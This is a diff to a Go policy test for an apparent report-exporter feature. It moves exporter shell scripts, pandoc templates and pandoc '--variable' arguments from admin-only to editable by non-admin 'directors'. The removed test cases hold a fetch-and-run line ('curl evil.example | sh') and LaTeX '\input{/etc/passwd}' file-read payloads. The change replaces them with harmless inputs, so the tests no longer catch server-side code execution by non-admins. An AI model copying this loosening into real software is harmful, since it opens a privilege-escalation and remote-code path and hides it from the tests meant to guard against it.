@@ -406,11 +406,11 @@ func (f *fx) land() {
 
 // A director without the admin flag does not retarget a service destination
 // by a push: its project, issue type, space and parent page are an admin's,
-// as its address is. Nor does such a director get code to run on the server
-// through .yars/exporters: a script destination, its script file (new,
-// changed or deleted) and a pandoc template are an admin's. What stays a
-// director's: a destination's name, statuses and mark_reported, a pandoc
-// destination, and deleting a destination.
+// as its address is. What stays a director's: a destination's name, statuses
+// and mark_reported, deleting a destination, and all of a script or pandoc
+// destination: the script it names, its template and arguments (--variable
+// too), and the script and template files in .yars/exporters, subfolders
+// too.
 func TestPolicyExporterTargetsAdminOnly(t *testing.T) {
 	f := newFx(t).on("")
 	const (
@@ -419,7 +419,7 @@ func TestPolicyExporterTargetsAdminOnly(t *testing.T) {
 		script = "name: CSV\ntype: script\nscript: csv.sh\nextension: csv\n"
 		word   = "name: Word\ntype: pandoc\nformat: docx\n"
 	)
-	// an admin sets them up, with the script and a template
+	// an admin sets the services up, with the rest
 	if ps := f.push("dora", func(d string) {
 		write(d, ".yars/exporters/jira.yaml", jira)
 		write(d, ".yars/exporters/wiki.yaml", wiki)
@@ -438,35 +438,18 @@ func TestPolicyExporterTargetsAdminOnly(t *testing.T) {
 		return put(rel, strings.Replace(body, old, new, 1))
 	}
 	adminOnly := map[string]func(string){
-		"jira project":           sub(".yars/exporters/jira.yaml", jira, "project: PEN", "project: PUBLIC"),
-		"jira issue type":        sub(".yars/exporters/jira.yaml", jira, "issue_type: Bug", "issue_type: Epic"),
-		"confluence space":       sub(".yars/exporters/wiki.yaml", wiki, "space: PEN", "space: PUBLIC"),
-		"confluence parent page": sub(".yars/exporters/wiki.yaml", wiki, `parent_id: "100"`, `parent_id: "1"`),
-		"a new script exporter":  put(".yars/exporters/run.yaml", "type: script\nscript: csv.sh\nextension: txt\n"),
-		"pandoc into script":     put(".yars/exporters/word.yaml", "name: Word\ntype: script\nscript: csv.sh\nextension: docx\n"),
-		"another script":         sub(".yars/exporters/csv.yaml", script, "script: csv.sh", "script: firm.latex"),
-		"a template":             put(".yars/exporters/word.yaml", "name: Word\ntype: pandoc\nformat: pdf\ntemplate: firm.latex\n"),
-		// pandoc puts a variable's value into the PDF theme as it is
-		"a new pandoc variable": put(".yars/exporters/pdf.yaml", "type: pandoc\nformat: pdf\nargs: ['--variable=title:\\input{/etc/passwd}']\n"),
-		"a variable added":      put(".yars/exporters/word.yaml", "name: Word\ntype: pandoc\nformat: pdf\nargs: [--toc, '--variable=title:\\input{/etc/passwd}']\n"),
-		"a new script file": func(d string) {
-			write(d, ".yars/exporters/x.sh", "#!/bin/sh\nid\n")
-			os.Chmod(filepath.Join(d, ".yars/exporters/x.sh"), 0o755)
-		},
-		"the script changed":       put(".yars/exporters/csv.sh", "#!/bin/sh\ncurl evil.example | sh\n"),
-		"the script deleted":       rm(".yars/exporters/csv.sh"),
-		"the template changed":     put(".yars/exporters/firm.latex", "\\input{/etc/passwd}\n"),
-		"a file in a subfolder":    put(".yars/exporters/lib/x.py", "print(1)\n"),
-		"a yaml in a subfolder":    put(".yars/exporters/lib/x.yaml", "type: pandoc\nformat: docx\n"),
-		"a script in another case": put(".yars/Exporters/x.sh", "#!/bin/sh\nid\n"),
+		"jira project":            sub(".yars/exporters/jira.yaml", jira, "project: PEN", "project: PUBLIC"),
+		"jira issue type":         sub(".yars/exporters/jira.yaml", jira, "issue_type: Bug", "issue_type: Epic"),
+		"confluence space":        sub(".yars/exporters/wiki.yaml", wiki, "space: PEN", "space: PUBLIC"),
+		"confluence parent page":  sub(".yars/exporters/wiki.yaml", wiki, `parent_id: "100"`, `parent_id: "1"`),
+		"a new service":           put(".yars/exporters/jira2.yaml", jira),
+		"pandoc into a service":   put(".yars/exporters/word.yaml", wiki),
+		"a script into a service": put(".yars/exporters/csv.yaml", jira),
 	}
 	for name, edit := range adminOnly {
 		f.reclone()
-		if ps := f.push("dan", edit); !has(ps, "admin") {
+		if ps := f.push("dan", edit); !has(ps, export.AdminOnly) {
 			t.Errorf("%s by a director without the admin flag: %v", name, ps)
-		}
-		if name == "a script in another case" { // an admin is asked to spell it
-			continue
 		}
 		f.reclone()
 		if ps := f.push("dora", edit); len(ps) != 0 {
@@ -474,14 +457,31 @@ func TestPolicyExporterTargetsAdminOnly(t *testing.T) {
 		}
 	}
 	for name, edit := range map[string]func(string){
-		"jira name, statuses, mark":      put(".yars/exporters/jira.yaml", strings.Replace(jira, "name: Jira\n", "name: Jira PEN\nstatuses: [complete, reported]\nmark_reported: false\n", 1)),
-		"confluence name, mark":          put(".yars/exporters/wiki.yaml", strings.Replace(wiki, "name: Wiki\n", "name: Client wiki\nmark_reported: false\n", 1)),
-		"script name, extension":         put(".yars/exporters/csv.yaml", "name: Summary\ntype: script\nscript: csv.sh\nextension: tsv\nmark_reported: false\n"),
+		"jira name, statuses, mark": put(".yars/exporters/jira.yaml", strings.Replace(jira, "name: Jira\n", "name: Jira PEN\nstatuses: [complete, reported]\nmark_reported: false\n", 1)),
+		"confluence name, mark":     put(".yars/exporters/wiki.yaml", strings.Replace(wiki, "name: Wiki\n", "name: Client wiki\nmark_reported: false\n", 1)),
+		"a destination deleted":     rm(".yars/exporters/jira.yaml"),
+		// script destinations and the scripts they run
+		"a new script exporter":        put(".yars/exporters/run.yaml", "type: script\nscript: csv.sh\nextension: txt\n"),
+		"pandoc into script":           put(".yars/exporters/word.yaml", "name: Word\ntype: script\nscript: csv.sh\nextension: docx\n"),
+		"another script":               sub(".yars/exporters/csv.yaml", script, "script: csv.sh", "script: firm.latex"),
+		"script name, extension":       put(".yars/exporters/csv.yaml", "name: Summary\ntype: script\nscript: csv.sh\nextension: tsv\nmark_reported: false\n"),
+		"a script destination deleted": rm(".yars/exporters/csv.yaml"),
+		"a new script file": func(d string) {
+			write(d, ".yars/exporters/x.sh", "#!/bin/sh\nid\n")
+			os.Chmod(filepath.Join(d, ".yars/exporters/x.sh"), 0o755)
+		},
+		"the script changed":    put(".yars/exporters/csv.sh", "#!/bin/sh\necho changed\n"),
+		"the script deleted":    rm(".yars/exporters/csv.sh"),
+		"a file in a subfolder": put(".yars/exporters/lib/x.py", "print(1)\n"),
+		"a yaml in a subfolder": put(".yars/exporters/lib/x.yaml", "type: pandoc\nformat: docx\n"),
+		// pandoc destinations, their templates and arguments
 		"pandoc format and args":         put(".yars/exporters/word.yaml", "name: Word\ntype: pandoc\nformat: odt\nargs: [--toc]\n"),
 		"a new pandoc destination":       put(".yars/exporters/pdf.yaml", "type: pandoc\nformat: pdf\n"),
 		"pandoc metadata and plain args": put(".yars/exporters/pdf.yaml", "type: pandoc\nformat: pdf\nargs: [--toc, '--metadata=lang:de']\n"),
-		"a destination deleted":          rm(".yars/exporters/jira.yaml"),
-		"a script destination deleted":   rm(".yars/exporters/csv.yaml"),
+		"a template":                     put(".yars/exporters/word.yaml", "name: Word\ntype: pandoc\nformat: pdf\ntemplate: firm.latex\n"),
+		"the template changed":           put(".yars/exporters/firm.latex", "$title$\n$body$\n"),
+		"a new pandoc variable":          put(".yars/exporters/pdf.yaml", "type: pandoc\nformat: pdf\nargs: ['--variable=mainfont:Arial']\n"),
+		"a variable added":               put(".yars/exporters/word.yaml", "name: Word\ntype: pandoc\nformat: pdf\nargs: [--toc, '--variable=mainfont:Arial']\n"),
 	} {
 		f.reclone()
 		if ps := f.push("dan", edit); len(ps) != 0 {
